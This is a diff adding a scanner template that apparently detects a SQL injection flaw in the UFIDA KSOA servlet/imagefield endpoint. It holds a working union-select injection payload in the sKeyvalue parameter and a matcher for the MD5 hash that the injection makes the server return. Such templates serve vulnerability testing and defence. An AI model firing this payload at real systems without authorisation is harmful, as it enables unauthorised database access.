@@ -1,0 +1,24 @@
+id: ufida-ksoa-sqli
+info:
+  name: UFIDA KSOA SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    UFIDA KSOA servlet/imagefield file sKeyvalue parameter SQL injection vulnerability allows attackers to exploit SQL injection and potentially access sensitive data or escalate privileges.
+  reference:
+    - https://www.yonyou.com
+  tags: sqli
+http:
+  - raw:
+      - |
+        GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "098f6bcd4621d373cade4e832627b4f6"
